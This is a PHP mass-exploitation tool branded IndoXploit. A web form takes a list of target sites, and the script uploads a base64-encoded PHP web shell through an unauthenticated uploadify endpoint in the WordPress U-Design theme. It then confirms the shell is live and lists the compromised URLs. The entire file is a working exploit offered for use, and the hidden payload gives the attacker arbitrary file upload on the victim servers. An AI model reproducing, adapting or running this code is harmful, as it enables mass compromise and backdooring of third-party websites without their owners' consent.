<html>
	<body onLoad="type_text()" ; bgColor=#FFFFFFF">
<center>
<form method="post" enctype="multipart/form-data">
Shellname: <br><input type="text" name='filename' style='width: 500px;' height="10" value='indoxploit.php' required><br>
Target: <br><textarea name="url" style="width: 500px; height: 200px;" placeholder="http://www.target.com/"></textarea><br>
<input type='submit' name='exp' value='Hajar!' style='width: 500px;'>
</form>
<?php
// IndoXploit
set_time_limit(0);
error_reporting(0);

function buffer() {
	ob_flush();
	flush();
}
function curl($url, $payload) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, $url);
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
function cek($url) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, $url);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
$file = htmlspecialchars($_POST['filename']);
$site = explode("\r\n", $_POST['url']);
$do = $_POST['exp'];
$uploader = base64_decode("PD9waHANCmVjaG8gIkluZG9YcGxvaXQgLSBBdXRvIFhwbG9pdGVyIFUtRGVzaWduIjsNCmVjaG8gIjxicj4iLnBocF91bmFtZSgpLiI8YnI+IjsNCmVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+DQo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4Jz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPg0KPC9mb3JtPiI7DQppZigkX1BPU1RbJ3VwbG9hZCddKSB7DQoJaWYoQGNvcHkoJF9GSUxFU1snaWR4J11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2lkeCddWyduYW1lJ10pKSB7DQoJZWNobyAic3Vrc2VzIjsNCgl9IGVsc2Ugew0KCWVjaG8gImdhZ2FsIjsNCgl9DQp9DQo/Pg==");
if($do) {
	$idx_dir = mkdir("indoxploit_tools", 0755);
	$shell = "indoxploit_tools/".$file;
	$fopen = fopen($shell, "w");
	fwrite($fopen, $uploader);
	fclose($fopen);
	foreach($site as $url) {
		$target = $url.'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php';
		$data = array(
			"Filedata" => "@$shell"
			);
		$curl = curl($target, $data);
		if($curl) {
			$cek = cek($url.'/'.$file);
			if(preg_match("/IndoXploit/i", $cek)) {
				echo "<a href='$url/$file' target='_blank'>$url/$file</a> -> shellmu<br>";
			}
		}
	buffer();
	}
}
?>
